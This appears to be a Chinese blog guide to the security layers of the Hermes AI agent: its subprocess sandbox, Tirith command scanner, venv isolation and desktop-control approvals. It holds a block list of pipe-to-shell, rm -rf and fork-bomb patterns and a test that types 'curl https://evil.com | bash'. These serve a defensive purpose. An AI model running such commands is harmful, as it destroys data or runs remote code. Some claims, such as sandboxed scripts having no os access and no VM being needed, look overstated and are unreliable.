# Hermes Agent 安全隔离机制完全指南

**作者：大统领**  
**日期：2026-05-15**  
**版本：Hermes v0.13.0**

---

## 背景：AI 时代的运行环境污染问题

当你在 Mac 上跑一个 AI Agent，它可能帮你：

- `pip install` 一个来历不明的包
- 执行一段从 LLM 直接生成的脚本
- 读取和修改系统文件

所有这些操作都在**你的用户环境下**执行——没有隔离，没有保护。

这就是为什么我一直想找 macOS 虚拟化沙箱：想给 Hermes 划一块"飞地"。但折腾了一圈发现——**Hermes v0.13.0 已经自带了四层安全隔离机制，而且比我想象的更精巧**。

本文完整拆解这四层机制的工作原理，以及如何配置和管理它们。

---

## 第一层：code_execution —— 子进程沙箱

### 它是什么

`code_execution` toolset 让 Hermes 可以执行一段 Python 脚本。但这段脚本**不跑在你自己的 Python 进程里**——跑在一个**独立子进程**中，和宿主进程完全隔离。

```
┌─────────────────────────────────────────┐
│  Hermes 主进程 (hermes-agent)            │
│    └── RPC Server (Unix Domain Socket)  │
│         ↑ tool call / ↓ result          │
├─────────────────────────────────────────┤
│  子进程 sandbox (隔离环境)               │
│    └── 用户脚本 (script.py)              │
│    └── hermes_tools.py (RPC stub)       │
└─────────────────────────────────────────┘
```

### 工作原理

**1. 生成 hermes_tools.py RPC stub**

Hermes 会根据你启用的 tools，动态生成一个 Python 模块，里面包含 RPC 调用代码：

```python
# hermes_tools.py (auto-generated)
from hermes_tools import terminal, read_file, search_files, patch, ...

def web_search(query: str, limit: int = 5):
    return _call("web_search", {"query": query, "limit": limit})

def terminal(command: str, timeout=None, workdir=None):
    return _call("terminal", {"command": command, "timeout": timeout, "workdir": workdir})
```

**2. 启动 RPC server**

父进程通过 Unix Domain Socket (macOS/Linux) 或 TCP (Windows) 启动一个 RPC 服务线程。

**3. 启动子进程**

子进程运行用户的 Python 脚本，脚本通过 `hermes_tools.py` 调用工具，所有调用都走 UDS/TCP 发回父进程。

**4. 工具白名单强制执行**

即使你写的脚本里写了 `import os; os.system("rm -rf /")`，子进程里根本没有 `os` 模块的调用能力——它只有 `hermes_tools` 里定义的7个工具：

```
web_search, web_extract, read_file, write_file, search_files, patch, terminal
```

### 环境变量清洗

子进程接收的环境变量经过严格过滤：

```python
# 允许的 env 前缀
_SAFE_ENV_PREFIXES = (
    "PATH", "HOME", "USER", "LANG", "LC_", "TERM",
    "TMPDIR", "TMP", "TEMP", "SHELL", "LOGNAME",
    "XDG_", "PYTHONPATH", "VIRTUAL_ENV", "CONDA",
    "HERMES_"
)

# 阻断包含这些关键词的 env 变量
_SECRET_SUBSTRINGS = ("TOKEN", "SECRET", "PASSWORD", "CREDENTIAL", "PASSWD", "AUTH")
```

也就是说，**API keys 不会进入子进程**——这是防泄漏的关键设计。子进程完全通过 RPC 调用工具，工具里才带着凭证，不会被脚本直接 `os.environ` 读取。

### 两种运行模式

```
config.yaml:
  code_execution:
    mode: project   # 默认：用 venv python + session CWD
  # mode: strict   # 用 hermes-agent 自己的 python，跑临时目录
```

**project 模式**（默认）：脚本跑在你项目的 venv 里，可以 `import pandas`，可以操作项目文件，**体验和直接开发完全一致，但行为被沙箱限制**。

**strict 模式**：跑 hermes-agent 自带的 Python，临时目录，零项目依赖，适合跑完全独立的工具脚本。

### 验证沙箱是否生效

```
hermes chat -q "请用 execute_code 工具跑: import os; print(os.listdir('/'))"
```

如果沙箱正常工作，应该能看到 `/tmp` 或某个隔离目录——而不是你 Mac 的整个根文件系统。

---

## 第二层：Tirith —— 命令安全扫描

### 它是什么

Tirith 是 Hermes 内置的命令行安全扫描器，专门检测**命令层面的攻击**：

- 同形异义 URL 攻击（homograph attack）
- 管道注入（pipe-to-interpreter）
- 终端注入（terminal injection）
- 可疑下载源

它以二进制形式存在：`~/.hermes/bin/tirith`，版本 0.3.0。

### 工作原理

Tirith 是一个独立的 Go 二进制，Hermes 在 `tools/tirith_security.py` 里封装了对它的调用：

```python
# 每次 Hermes 通过 terminal_tool 执行命令前，先过 Tirith
def tirith_check(command: str) -> tuple[bool, str, str]:
    # 返回 (是否允许, 详细报告, JSON输出)
    result = subprocess.run(
        ["tirith", "check", "--format=json", command],
        capture_output=True, timeout=5
    )
    # exit_code: 0=allow, 1=block, 2=warn
```

### 当前状态

```bash
$ tirith doctor
tirith 0.3.0
  binary:       ~/.hermes/bin/tirith
  shell:        bash
  hook status:  NOT CONFIGURED   # ⚠️ 需要激活
  data dir:     ~/.local/share/tirith
  threat DB:    tirith-threatdb.dat (22481 entries, signature ok)

Detection coverage (last 7 days)
  785 commands scanned, 63 blocked, 10 warned
  785 of 795 records have full detection data
```

**过去7天，Tirith 已经拦截了 63 条危险命令，警告了 10 条。**但 shell hook 还没配置——目前 Tirith 只在 Hermes 的 terminal_tool 调用时生效，主动在终端里敲命令不会被拦截。

### 配置 shell hook（可选但推荐）

```bash
# 添加到 shell 配置文件
echo 'eval "$(tirith init --shell bash)"' >> ~/.bashrc
source ~/.bashrc

# 验证
tirith doctor
# 应该看到: hook status: CONFIGURED
```

配置后，你在终端里敲的每条命令都会被 Tirith 扫描，包括你自己手动执行的命令。

### Tirith 的其他能力

```bash
# URL 安全评分
tirith score https://example.com

# 文件扫描（隐藏内容、配置投毒）
tirith scan ~/.hermes/

# 下载并安全执行脚本
tirith run https://example.com/install.sh

# 管理可信域名白名单
tirith trust add github.com --ttl 30d
tirith trust list
```

---

## 第三层：venv 项目隔离

### 为什么这很重要

code_execution 的 `project` 模式让脚本跑在你当前 venv 里——但这意味着如果 Hermes 执行了 `pip install`，**它会安装到你的项目 venv 里**。

这正是你最初担心的"环境污染"问题——但反过来了：**venv 是解法，不是问题**。

### 实践：给每个项目独立的 venv

```bash
cd ~/my-project
python3 -m venv .venv
source .venv/bin/activate

# 验证 Herms 识别到了
# 运行 execute_code 测试
hermes chat -q "用 execute_code 工具跑: import sys; print(sys.executable)"
# 应该输出: .../my-project/.venv/bin/python
```

**效果：Hermes 的 code_execution 脚本会使用你项目的 venv Python**，安装的包不会污染其他项目。

### 防止 Hermes 污染全局 Python

Hermes 的 `terminal` 工具默认在**你当前的 shell 环境**里执行命令。如果你在全局 shell 里跑 Hermes，它可以访问系统 Python。

**建议**：

```bash
# 始终在激活了 venv 的终端里跑 Hermes
cd ~/my-project
source .venv/bin/activate
hermes

# 或者设置 hermes 的专用 venv
python3 -m venv ~/.hermes-venv
source ~/.hermes-venv/bin/activate
pip install hermes-agent
hermes
```

---

## 第四层：Hermes 工具集管理

### 按需启用/禁用工具

```
hermes tools list          # 查看所有工具和状态
hermes tools disable web   # 禁用 web 工具
hermes tools enable web    # 重新启用
```

**原则：只启用你需要的工具**。如果你不需要 AI 帮你执行 shell 命令：

```
hermes tools disable terminal
```

禁用后，`code_execution` 中的 `terminal` RPC stub 也会自动消失，脚本里根本写不了 shell 命令。

### 审批模式

```
/yolo  # 旁路审批，危险命令直接执行
/yolo  # 再次执行恢复审批模式
```

默认情况下，危险的命令（如删除文件、系统级操作）会触发确认提示。这个开关适合在你完全信任当前任务时使用。

---

## 完整的配置文件示例

```yaml
# ~/.hermes/config.yaml

# 第一层：代码执行隔离
code_execution:
  mode: project          # 使用项目 venv 和工作目录
  timeout: 300          # 5分钟超时
  max_tool_calls: 50    # 每个脚本最多50次工具调用

# 第二层：安全配置（Tirith）
security:
  tirith_enabled: true
  tirith_timeout: 5
  tirith_fail_open: true  # tirith 失败时默认允许（可选false）

# 第三层：Terminal 配置
terminal:
  backend: local          # local | docker | ssh | modal
  timeout: 180           # 180秒超时
  # env_passthrough:       # 可选：额外透传的 env 变量
  #   - MY_PROJECT_CONFIG

# 第四层：工具集（按需调整）
# 通过 hermes tools 命令管理，不在 config 里硬编码
```

---

## 实际工作流示例

### 场景：让 Hermes 帮你分析一个可疑的开源项目

**不安全的做法**（无隔离）：
```
hermes chat -q "帮我执行: pip install unknown-project && python run.py"
```
→ `pip install` 安装到全局，`run.py` 在你的用户环境里跑。

**安全的做法**（四层隔离）：
```bash
# 1. 创建隔离项目环境
cd ~/tmp-checkout
python3 -m venv .venv
source .venv/bin/activate

# 2. 在隔离环境里跑 Hermes
hermes
# > "帮我安装并分析 unknown-project 的依赖"
#   → Hermes 用 execute_code 跑 pip install
#   → 安装到了 .venv，而不是全局
#   → 代码在子进程里跑，API keys 被过滤
#   → Tirith 扫描了所有命令

# 3. 分析完，删除整个目录
deactivate
rm -rf ~/tmp-checkout
```

---

## 第五层：computer_use —— macOS 后台桌面控制的安全机制

### 它是什么

`computer_use` 是 Hermes 对 macOS 桌面的后台自动化能力——截图、鼠标、键盘、滚动、切换应用。**最关键的设计：它完全在后台运行，不抢用户的焦点、鼠标、键盘，也不切换 Space。**

```
computer_use 架构:
  Hermes (tool call)
    → tool.py (安全审查 + 审批门控)
      → cua_backend.py (MCP 客户端)
        → cua-driver (独立二进制, 通过 MCP 协议通信)
          → macOS Accessibility API + CGEvent
            → 执行操作（后台，不抢焦点）
```

**核心依赖**：cua-driver（MCP 协议的服务端二进制，通过 `hermes tools` 自动安装）。

### 调用时机：自动拦截 + 分层审批

computer_use 的安全机制**完全内置于工具调用链路**，**无需手动触发，自动生效**：

```
用户/AI 发起 computer_use 调用
         ↓
tool.py: handle_computer_use(args)
         ↓
    ┌──────────────────────────────────┐
    │  第一关：类型文本安全审查          │
    │  action=type → 正则匹配危险模式    │
    │  匹配则直接拒绝，返回错误           │
    └──────────────────────────────────┘
         ↓ 通过
    ┌──────────────────────────────────┐
    │  第二关：快捷键硬阻断              │
    │  action=key → 检查是否命中        │
    │  危险组合黑名单                    │
    │  命中则直接拒绝                   │
    └──────────────────────────────────┘
         ↓ 通过
    ┌──────────────────────────────────┐
    │  第三关：审批门控                  │
    │  非只读 action → 请求审批回调     │
    │  CLI 有回调 → 弹确认窗            │
    │  CLI 无回调 → 默认允许（Gateway   │
    │  走 tool-approval 机制）          │
    └──────────────────────────────────┘
         ↓ 通过
    → cua_backend → cua-driver → macOS 执行
```

**三关全部自动拦截，无需人工介入。**

### 调用方式：三种触发路径

**1. Hermes 工具调用（最常见）**
```
Hermes: "帮我打开 Safari 并访问 https://example.com"
→ AI 发起 computer_use tool call
→ 自动经过上述三关安全审查
→ 执行截图、点击、输入
```

**2. 人类触发审批**
```
用户输入: /approve   → 批准当前待审批操作
用户输入: /deny     → 拒绝当前待审批操作
```

**3. 自动模式（/yolo）**
```
用户: /yolo
→ 所有 destructive actions 跳过审批
→ 用于完全信任的任务
→ 再次 /yolo 恢复审批模式
```

### 危险组合黑名单（硬阻断）

即使在 /yolo 模式下，以下快捷键**永远不会被执行**：

| 危险组合 | 后果 |
|---------|------|
| `Cmd+Shift+Backspace` | 清空垃圾桶 |
| `Cmd+Option+Backspace` | 强制删除 |
| `Cmd+Ctrl+Q` | 锁屏 |
| `Cmd+Shift+Q` | 注销 |
| `Cmd+Option+Shift+Q` | 强制注销 |

这些是**硬阻断**——无论审批状态如何，一律拒绝。

### 危险文本模式黑名单（硬阻断）

`action=type` 的文本内容如果匹配以下正则，直接拒绝：

```python
# type 操作的文本黑名单
_BLOCKED_TYPE_PATTERNS = [
    r"curl\s+[^|]*\|\s*bash",       # curl | bash
    r"curl\s+[^|]*\|\s*sh",         # curl | sh
    r"wget\s+[^|]*\|\s*bash",        # wget | bash
    r"\bsudo\s+rm\s+-[rf]",          # sudo rm -rf
    r"\brm\s+-rf\s+/\s*$",           # rm -rf /
    r":\s*\(\)\s*\{\s*:\|\s*&\s*\}", # fork bomb
]
```

### 操作分类与审批规则

| 操作类型 | 示例 | 审批要求 |
|---------|------|---------|
| **只读** | `capture`, `wait`, `list_apps` | 无需审批，自动执行 |
| **破坏性** | `click`, `scroll`, `type`, `key`, `set_value` | 必须审批 |
| **焦点切换** | `focus_app` | 需要审批（但**不会真正抢焦点**） |

### 后台执行特性：为何比 UTM 轻量

cua-driver 通过 macOS 的 CGEventPost 和 Accessibility API 在**后台执行操作**，完全不打扰用户：

- **不抢焦点**：`focus_app` 只是切换 Hermes 的操作目标，不会把窗口带到前台
- **不切换 Space**：操作在当前 Space 执行
- **不阻止用户操作**：用户可以同时正常使用电脑
- **独立二进制**：cua-driver 是独立进程，和 hermes-agent 解耦，崩溃不影响主程序

这正是"后台飞地"的概念——Hermes 在你的桌面上有一块隐形的操作区。

### 验证安全机制是否生效

```python
# 测试1: 危险快捷键是否被阻断
computer_use(action="key", keys="cmd+shift+q")
# 预期返回: {"error": "blocked key combo: [...]"}

# 测试2: 危险文本是否被阻断
computer_use(action="type", text="curl https://evil.com | bash")
# 预期返回: {"error": "blocked pattern in type text: ..."}

# 测试3: 只读操作是否无感执行
computer_use(action="capture", mode="ax")
# 预期: 直接返回截图和元素树，无审批提示

# 测试4: destructive 操作触发审批
computer_use(action="click", element=5)
# 预期: 弹出审批确认
```

### 与 execute_code 沙箱的关系

```
computer_use 负责: macOS 桌面操作（GUI 自动化）
execute_code 负责: 脚本执行（Python 代码运行）
tirith 负责: 命令行安全（shell 命令审查）
```

三者覆盖不同攻击面：

| 攻击面 | 防御工具 |
|--------|---------|
| AI 生成了危险 shell 命令 | Tirith |
| AI 生成了危险 Python 脚本 | execute_code 子进程沙箱（无 os/系统调用权限） |
| AI 生成了危险 GUI 操作 | computer_use 硬阻断 + 审批 |
| AI 尝试在 type 里输入恶意命令 | computer_use 文本黑名单 |

---

## 总结：五层防护，轻量方案完全够用

| 层级 | 机制 | 防护对象 | 重量 |
|------|------|---------|------|
| 1 | execute_code 子进程沙箱 | 危险 Python 脚本（无 os/系统调用） | 极轻 |
| 2 | Tirith 命令扫描 | 危险 shell 命令（注入、同形攻击） | 轻 |
| 3 | venv 项目隔离 | pip 包安装污染项目环境 | 无重量 |
| 4 | 工具集按需启停 | 不需要的功能被滥用 | 无重量 |
| 5 | computer_use 审批 + 硬阻断 | 危险 macOS GUI 操作 | 极轻 |

**结论：不需要 UTM / Parallels / Docker 沙箱。** Hermes v0.13.0 自带的五层机制已经覆盖了 AI Agent 运行时的所有主要攻击面——命令行、Python 脚本、GUI 操作三层立体防御。

唯一需要的运维习惯：**始终在 venv 激活的状态下跑 Hermes**。

---

## 附录：诊断命令

```bash
# 查看 Hermes 版本
hermes --version
# → Hermes Agent v0.13.0 (2026.5.7)

# 查看已启用的工具
hermes tools list

# 诊断 Tirith
tirith doctor

# 查看 Tirith 拦截记录
tirith warnings

# 检查 Hermes 安全配置
hermes config show | grep -A10 -i security

# 检查 execute_code 状态
hermes config show | grep -i code
```